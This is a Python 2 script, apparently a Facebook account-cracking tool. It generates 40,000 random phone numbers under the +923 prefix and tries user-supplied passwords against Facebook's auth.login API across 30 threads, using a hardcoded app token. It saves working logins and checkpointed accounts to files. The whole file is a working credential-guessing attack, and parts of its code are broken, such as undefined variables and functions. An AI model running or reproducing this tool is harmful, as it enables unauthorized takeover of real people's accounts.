#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
T = '\x1b[1;33m'
I = '\x1b[0m'
my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 READEME.md')
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
useragents = [
 ('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
http_proxy  = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
def keluar():
        print "\033[1;97m{\033[1;91m!\033[1;97m} Successful Close program"
        os.sys.exit()
        
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)

def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
logo = """

  \033[032m   _________________      _____   .___ 
  \033[032m  /   _____/\_____  \    /     \  |   |
  \033[036m  \_____  \  /   |   \  /  \ /  \ |   |
  \033[036m  /        \/    |    \/    Y    \|   |
  \033[033m /_______  /\_______  /\____|__  /|___|
  \033[033m         \/         \/         \/      
"""

    
pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []


def somi():
    print logo
    print
    print"\033[1;93m╔═══╗ "
    print"\033[1;93m║\033[1;96m 1 \033[1;93m║\033[1;97mLogin With  Facebook Cookies "
    print"\033[1;91m╚═══╝ "
    print"\033[1;93m╔═══╗ "
    print"\033[1;93m║ \033[1;96m2 \033[1;93m║\033[1;97mLogin With Facebook Token"
    print"\033[1;91m╚═══╝ "
    print"\033[1;93m╔═══╗ "
    print"\033[1;93m║ \033[1;93m0 \033[1;93m║\033[1;97mStop Program "
    print"\033[1;91m╚═══╝ "
	
    pilih_somi()

def pilih_somi():
    somi = raw_input('╚══════⇒ ')
    if somi == '':
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        somi()
    elif somi == '1':
    	os.system('clear')
        man()
    elif somi == '2':
    	os.system('clear')
        login_token()
    elif somi == '0':
        os.system('rm -rf login.txt')
        os.system('exit')
    else:
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        yayanxd()




def man():
        global pw,loop
        try:
            	c = raw_input('\033[1;93mCODE\033[1;96m: >>> ')
                k = "+923"
                idt = '.txt'
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit("  [!] file does not exist ")
        
        pw = raw_input("  [*] Enter password : ").split(",")
        if len(pw) ==0:
            	exit("  [!] file does not exist ")
        print ' \033[1;97m[\033[1;92m✓\033[1;97m] OK results are saved to: ok.txt \n \033[1;97m[\033[1;92m×\033[1;97m] CP results are saved to: cp.txt \ n'
        print ' \x1b[1;97m[\033[1;91m!\033[1;97m]\x1b[1;93mTo Stop Process Press CTRL Then Press z'
        
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
        global loop,pw
        try:
        	    #a = s.get(api.format("%s?access_token=%s"%(str(user),token)),headers=hea).json()
                #b = a["birthday"]
                for i in pw:
                        URL="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(user)+"&locale=en_US&password="+str(i)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                        w = s.get(URL,headers=hea).json()
                        if "access_token" in w:
                                print (H+"\r >> %s|%s %s              "%(user,i,I))
                                wrt="%s|%s"%(k + c + user,i)
                                open("crack/Successful.txt","a").write("%s\n"%(wrt))
                                Successful.append(wrt)
                        elif 'www.facebook.com' in w['error_msg']:
                                print (K+"\r >> %s|%s|%s %s              "%(user,i,b,I))
                                wrt="%s|%s"%(k + c + user,i)
                                Checkpoint.append(wrt)
                                open("crack/Checkpoint.txt","a").write("%s\n"%(wrt))
                loop +=1
                sys.stdout.write(
                        "\r  \033[1;97m[\033[1;92m+\033[1;97m] Please Wait...\033[1;95m (\033[1;92m%s\033[1;91m/\033[1;93m%s \033[1;35m) - \033[1;36mok\033[1;31m-:\033[1;32m%s \033[1;91m- \033[1;33mcp\033[1;31m-:\033[1;36m%s"%(loop,len(target),len(Successful),len(Checkpoint))
                ); sys.stdout.flush()
        except: pass

def results(Successful, Checkpoint):
    if len(Successful) != 0:
    	print '\n\n [✓] finished.'
        print '\n [*] OK : ' + str(len(Successful))
    if len(Checkpoint) != 0:
    	print '\n\n [✓] finished.'
        print '\n [*] CP : ' + str(len(Checkpoint))
    if len(Successful) == 0 and len(Checkpoint) == 0:
        print '\n'
        print ' [!] Sorry Account not Found'

if __name__=="__main__":
        somi()
        Somi()
